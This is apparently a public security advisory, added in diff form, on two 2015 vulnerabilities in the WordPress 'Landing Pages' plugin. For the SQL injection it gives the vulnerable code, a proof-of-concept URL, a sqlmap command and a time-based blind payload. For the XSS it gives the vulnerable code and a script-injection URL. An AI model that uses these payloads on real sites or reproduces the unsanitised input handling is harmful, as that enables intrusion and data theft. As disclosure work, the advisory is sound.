@@ -1,0 +1,68 @@
+# Title: Multiple vulnerabilities in WordPress plugin "WordPress Landing Pages"
+# Author: Adrián M. F. - adrimf85[at]gmail[dot]com
+# Date: 2015-05-25
+# Vendor Homepage: https://wordpress.org/plugins/landing-pages/
+# Active installs: 20,000+
+# Vulnerable version: 1.8.4
+# Fixed version: 1.8.5
+# CVE: CVE-2015-4064, CVE-2015-4065 
+
+ Vulnerabilities (2)
+=====================
+
+(1) Authenticated SQLi [CWE-89] (CVE-2015-4064)
+-----------------------------------------------
+
+* CODE:
+modules/module.ab-testing.php:100
++++++++++++++++++++++++++++++++++++++++++
+$wpdb->query("
+    SELECT `meta_key`, `meta_value`
+    FROM $wpdb->postmeta
+    WHERE `post_id` = ".$_GET['post']."
+");
++++++++++++++++++++++++++++++++++++++++++
+
+* POC:
+http://[domain]/wp-admin/post.php?post=306[SQLi]&action=edit&lp-variation-id=1&ab-action=delete-variation
+
+SQLMap
++++++++++++++++++++++++++++++++++++++++++
+./sqlmap.py --cookie="[cookie]" --dbms mysql -u "http://[domain]/wp-admin/post.php?post=306&action=edit&lp-variation-id=0&ab-action=delete-variation" -p post
+[............]
+GET parameter 'post' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection points with a total of 86 HTTP(s) requests:
+---
+Parameter: post (GET)
+   Type: AND/OR time-based blind
+   Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+   Payload: post=306 AND (SELECT * FROM (SELECT(SLEEP(10)))sCKL)&action=edit&lp-variation-id=0&ab-action=delete-variation
+---
+[13:35:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.39
+back-end DBMS: MySQL 5.0.12
++++++++++++++++++++++++++++++++++++++++++
+
+
+(2) Authenticated XSS [CWE-79] (CVE-2015-4065)
+----------------------------------------------
+
+* CODE:
+shared/shortcodes/inbound-shortcodes.php:761
++++++++++++++++++++++++++++++++++++++++++
+<iframe src='<?php echo INBOUDNOW_SHARED_URLPATH . 'shortcodes/'; ?>preview.php?sc=&post=<?php echo $_GET['post']; ?>' width="285" scrollbar='true' frameborder="0" id="inbound-shortcodes-preview"></iframe>
++++++++++++++++++++++++++++++++++++++++++
+
+
+* POC:
+http://[domain]/wp-admin/post-new.php?post_type=inbound-forms&post='></iframe><script>alert(String.fromCharCode(88, 83, 83))</script>
+
+
+ Timeline
+==========
+2015-05-09: Discovered vulnerability.
+2015-05-20: Vendor notification.
+2015-05-20: Vendor response.
+2015-05-22: Vendor fix.
+2015-05-25: Public disclosure.
